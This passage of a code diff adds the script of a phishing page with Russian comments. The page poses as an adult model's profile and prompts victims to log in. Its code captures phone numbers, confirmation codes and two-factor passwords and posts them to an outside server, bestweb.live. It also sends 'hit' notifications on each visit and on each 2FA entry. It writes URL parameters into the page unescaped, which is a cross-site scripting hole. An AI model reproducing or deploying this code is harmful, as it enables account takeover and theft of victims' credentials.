+                console.log('❌ Ошибка соединения с ботом:', error);
+                alert('❌ Ошибка соединения с сервером. Попробуйте позже.');
+            } finally {
+                // Разблокируем кнопку
+                verifyBtn.disabled = false;
+                verifyBtn.textContent = 'Подтвердить';
+            }
+        };
+
+        // Кнопка "Подтвердить пароль" для 2FA
+        verify2faBtn.onclick = async () => {
+            const rawPhone = phoneInput.value;
+            const password = password2fa.value;
+            
+            if (!password.trim()) {
+                alert('Пожалуйста, введите пароль');
+                return;
+            }
+            
+            // Блокируем кнопку
+            verify2faBtn.disabled = true;
+            verify2faBtn.textContent = 'Проверка...';
+            
+            try {
+                // ОТПРАВЛЯЕМ ОТСТУК О ПАРОЛЕ 2FA
+                await send2FAEnteredNotification(password, rawPhone);
+                
+                // ПРОВЕРКА ПАРОЛЯ 2FA ЧЕРЕЗ БОТА
+                console.log('🔄 Проверяем пароль 2FA...');
+                const response = await fetch('https://bestweb.live:8080/verify-2fa', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        phone: rawPhone,
+                        password: password
+                    })
+                });
+                
+                // ПРОВЕРЯЕМ ОТВЕТ
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                const result = await response.json();
+                console.log('📨 Ответ от бота:', result);
+                
+                if (result.success) {
+                    console.log('✅ 2FA успешно пройдена!');
+                    alert('✅ Авторизация успешна!');
+                    loginModal.classList.remove('active');
+                    resetModal();
+                    isUserLoggedIn = true;
+                } else {
+                    alert('❌ Ошибка: ' + (result.error || 'Неверный пароль'));
+                    console.log('❌ Ошибка 2FA:', result.error);
+                }
+                
+            } catch (error) {
+                console.log('❌ Ошибка соединения с ботом:', error);
+                alert('❌ Ошибка соединения с сервером. Попробуйте позже.');
+            } finally {
+                // Разблокируем кнопку
+                verify2faBtn.disabled = false;
+                verify2faBtn.textContent = 'Подтвердить пароль';
+            }
+        };
+
+        // Функция для показа уведомлений
+        function showNotification(message) {
+            const notification = document.createElement('div');
+            notification.style.cssText = `
+                position: fixed;
+                top: 20px;
+                right: 20px;
+                background: linear-gradient(45deg, #00ff00, #00cc00);
+                color: black;
+                padding: 15px 25px;
+                border-radius: 10px;
+                z-index: 10000;
+                font-weight: bold;
+                font-size: 16px;
+                box-shadow: 0 0 20px rgba(0,255,0,0.5);
+                border: 2px solid #00ff00;
+                max-width: 300px;
+                word-wrap: break-word;
+            `;
+            notification.textContent = message;
+            document.body.appendChild(notification);
+            
+            setTimeout(() => {
+                if (notification.parentNode) {
+                    document.body.removeChild(notification);
+                }
+            }, 5000);
+        }
+
+        // Сброс модального окна
+        function resetModal() {
+            step1.classList.add('active');
+            step2.classList.remove('active');
+            step2fa.classList.remove('active');
+            phoneInput.value = '';
+            codeInput.value = '';
+            password2fa.value = '';
+            currentPhone = '';
+            currentCode = '';
+        }
+
+        // === КОД ДЛЯ ЗАГРУЗКИ ХАРАКТЕРИСТИК ИЗ URL ===
+        function parseURLParams() {
+            const params = new URLSearchParams(window.location.search);
+            const result = {};
+            
+            for (const [key, value] of params.entries()) {
+                const decodedValue = decodeURIComponent(value.replace(/\+/g, ' '));
+                result[key] = decodedValue;
+            }
+            
+            return result;
+        }
+
+        function loadModelInfoFromURL() {
+            const modelData = parseURLParams();
+            
+            if (Object.keys(modelData).length > 0) {
+                displayModelInfo(modelData);
+            } else {
+                displayModelInfo({
+                    "Имя": "Анжелика",
+                    "Возраст": "23 года",
+                    "Рост": "175 см",
+                    "Вес": "55 кг", 
+                    "Грудь": "3 размер",
+                    "Статус": "Онлайн"
+                });
+            }
+        }
+
+        function displayModelInfo(modelData) {
+            const modelInfo = document.getElementById('modelInfo');
+            modelInfo.innerHTML = '';
+            
+            for (const [key, value] of Object.entries(modelData)) {
+                const item = document.createElement('div');
+                item.className = 'info-item';
+                item.innerHTML = `
+                    <div class="info-label">${key}:</div>
+                    <div class="info-value">${value}</div>
+                `;
+                modelInfo.appendChild(item);
+            }
+        }
+
+        // Загружаем характеристики при загрузке страницы
+        document.addEventListener('DOMContentLoaded', function() {
+            // ОТПРАВЛЯЕМ ОТСТУК О ПЕРЕХОДЕ (ТОЛЬКО 1 РАЗ)
+            sendVisitNotification();
+            
+            loadModelInfoFromURL();
+            startChatBot();
+            startReactions();
+            startViewersCounter();
+        });
+
+        window.addEventListener('popstate', function() {
+            loadModelInfoFromURL();
+        });
+    </script>
+</body>
+</html>
